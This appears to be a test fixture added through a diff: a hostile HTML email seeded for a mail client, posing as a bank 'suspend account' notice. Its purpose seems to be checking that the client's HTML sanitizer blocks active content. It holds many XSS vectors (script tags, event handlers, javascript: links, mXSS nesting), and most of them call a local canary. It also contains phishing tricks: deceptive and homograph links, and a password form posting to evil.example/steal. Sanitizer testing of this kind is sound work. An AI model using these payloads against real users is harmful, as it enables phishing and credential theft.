@@ -1,0 +1,48 @@
+Date: Sat, 01 Aug 2026 07:30:00 +0000
+From: Vice Bank <service@bank.example>
+To: Alice Archer <alice@vicemail.test>
+Subject: =?utf-8?B?WW91ciBhY2NvdW50IHdpbGwgYmUgc3VzcGVuZGVkIOKAkyB2ZXJpZnkgbm93?=
+Message-ID: <html.hostile@seed.vicemail.test>
+X-Vicemail-Seed: html/hostile
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv=3D"refresh" content=3D"0; url=3Dhttps://evil.example/refre=
+sh">
+<base href=3D"https://evil.example/">
+<script>document.title =3D 'script ran'; fetch('http://127.0.0.1:18999/js/h=
+tml-hostile/script-tag');</script>
+</head>
+<body onload=3D"fetch('http://127.0.0.1:18999/js/html-hostile/body-onload')=
+">
+<h2>Vice Bank =E2=80=93 Security notice</h2>
+<p>Please <a href=3D"https://evil.example/login">https://bank.example/login=
+</a> to verify your account.</p>
+<p><a href=3D"javascript:alert('javascript-link')">Click here</a> |
+<a href=3D"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">data link<=
+/a> |
+<a href=3D"https://xn--bnk-sna.example/">https://b=C3=A4nk.example/</a> |
+<a href=3D"https://bank.example@evil.example/">https://bank.example/account=
+</a></p>
+<img src=3D"x" onerror=3D"fetch('http://127.0.0.1:18999/js/html-hostile/img=
+-onerror')">
+<svg onload=3D"fetch('http://127.0.0.1:18999/js/html-hostile/svg-onload')">=
+<script>fetch('http://127.0.0.1:18999/js/html-hostile/svg-script')</script>=
+</svg>
+<iframe srcdoc=3D"&lt;script&gt;parent.postMessage('iframe-srcdoc','*')&lt;=
+/script&gt;"></iframe>
+<form action=3D"https://evil.example/steal" method=3D"post"><input name=3D"=
+password" type=3D"password">
+<button type=3D"submit">Log in</button></form>
+<div style=3D"width: expression(alert('css-expression'))">IE expression</di=
+v>
+<a href=3D"#" onclick=3D"fetch('http://127.0.0.1:18999/js/html-hostile/oncl=
+ick')">onclick</a>
+<object data=3D"javascript:alert('object')"></object>
+<math><mtext><table><mglyph><style><img src=3Dx onerror=3D"fetch('http://12=
+7.0.0.1:18999/js/html-hostile/mxss')"></style></mglyph></table></mtext></ma=
+th>
+</body></html>
